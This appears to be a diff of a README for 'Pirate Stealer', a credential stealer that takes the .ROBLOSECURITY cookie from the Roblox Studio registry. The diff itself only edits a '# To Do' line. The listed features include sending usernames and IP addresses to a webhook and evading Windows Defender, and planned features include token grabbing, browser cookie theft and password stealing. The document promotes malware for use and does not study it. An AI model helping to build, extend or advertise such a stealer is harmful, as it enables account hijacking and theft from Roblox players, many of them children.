@@ -7,7 +7,7 @@ Pirate Stealer steals .ROBLOSECURITY cookie from Roblox Studio Registry
 🟢Sends Roblox Username to webhook\n
 🟢Sends IP Address to webhook\n
 🟣NOT DETECTED BY WINDOWS DEFENDER AND SOME OTHER ANTI VIRUSES\n
-# To Do\n
+# To Do
 💎Add Token Grabber\n
 💎Add Steal Cookies from browser\n
 💎Add Password Stealer\n
